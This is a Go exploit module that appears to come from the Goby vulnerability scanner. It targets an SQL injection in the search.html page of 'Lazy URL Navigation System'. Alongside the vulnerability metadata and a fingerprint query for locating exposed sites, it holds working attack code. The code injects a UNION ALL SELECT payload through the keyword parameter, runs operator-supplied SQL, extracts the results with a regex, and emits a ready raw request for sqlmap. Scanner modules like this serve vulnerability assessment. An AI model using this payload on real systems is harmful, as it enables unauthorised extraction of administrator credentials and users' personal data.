package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Lazy URL Navigation System /search.html SQL Injection Vulnerability",
    "Description": "<p>Lazy URL Navigation System is an intelligent URL navigation platform designed to help users quickly find the URLs and resources they need. The system provides intelligent URL search and recommendation functions, which can recommend relevant URLs and resources based on users' search habits and preferences. At the same time, the system also provides functions such as URL classification, URL collection and URL sharing, which is convenient for users to manage and share URLs. </p><p>In addition to the SQL injection vulnerability at the interface of the search.html interface of the lazy URL navigation page, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password and site user personal information), and the attacker can even write commands to the server with high privilege to further obtain the server system permissions.</p>",
    "Product": "Lazy URL Navigation System",
    "Homepage": "https://lanrenao.com/",
    "DisclosureDate": "2024-05-22",
    "PostTime": "2024-11-05",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"./templates/antidote/css/style.css\" && (body=\"assets/layer/layer.js\" || body=\"/js/jquery.min.js\")",
    "GobyQuery": "body=\"./templates/antidote/css/style.css\" && (body=\"assets/layer/layer.js\" || body=\"/js/jquery.min.js\")",
    "Level": "1",
    "Impact": "<p>In addition to the SQL injection vulnerability at the interface of the search.html interface of the lazy URL navigation page, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password and site user personal information), and the attacker can even write commands to the server with high privilege to further obtain the server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/139114514"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "懒人网址导航页 /search.html SQL 注入漏洞",
            "Product": "懒人网址导航页",
            "Description": "<p>懒人网址导航系统是一种智能化的网址导航平台，旨在帮助用户快速找到所需的网址和资源。该系统提供了智能化的网址搜索和推荐功能，能够根据用户的搜索习惯和偏好推荐相关的网址和资源。同时，系统还提供了网址分类、网址收藏和网址分享等功能，方便用户管理和共享网址。<br></p><p>懒人网址导航页 search.html 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>懒人网址导航页 search.html 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Lazy URL Navigation System /search.html SQL Injection Vulnerability",
            "Product": "Lazy URL Navigation System",
            "Description": "<p>Lazy URL Navigation System is an intelligent URL navigation platform designed to help users quickly find the URLs and resources they need. The system provides intelligent URL search and recommendation functions, which can recommend relevant URLs and resources based on users' search habits and preferences. At the same time, the system also provides functions such as URL classification, URL collection and URL sharing, which is convenient for users to manage and share URLs.&nbsp;</p><p>In addition to the SQL injection vulnerability at the interface of the search.html interface of the lazy URL navigation page, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password and site user personal information), and the attacker can even write commands to the server with high privilege to further obtain the server system permissions.</p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to the SQL injection vulnerability at the interface of the search.html interface of the lazy URL navigation page, an unauthenticated malicious attacker can exploit the SQL injection vulnerability to obtain information in the database (such as administrator background password and site user personal information), and the attacker can even write commands to the server with high privilege to further obtain the server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setSqlPayloadHashasiuhaufcahsygyahbjgkcshkjhagdgfetaygvcgtyegjgauyhbgkyuhugjyuhb := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767071,(`+sql+`),0x7170716a71,0x78),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewGetRequestConfig(sqlUrl + "?keyword=" + sql)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/search.html"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/search.html"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "8ebb81fcca5cd991bbec70f8907d78aa"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select md5('ahscuasgvc')`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzvpq([\s\S]*?)qpqjqx`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasiuhaufcahsygyahbjgkcshkjhagdgfetaygvcgtyegjgauyhbgkyuhugjyuhb
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767071,md5(1),0x7170716a71,0x78),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: keep-alive`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qzvpq([\s\S]*?)qpqjqx`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasiuhaufcahsygyahbjgkcshkjhagdgfetaygvcgtyegjgauyhbgkyuhugjyuhb
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select database()"
					} else if way == "db_version" {
						sql = "select version()"
					} else if way == "user_name" {
						sql = "select user()"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
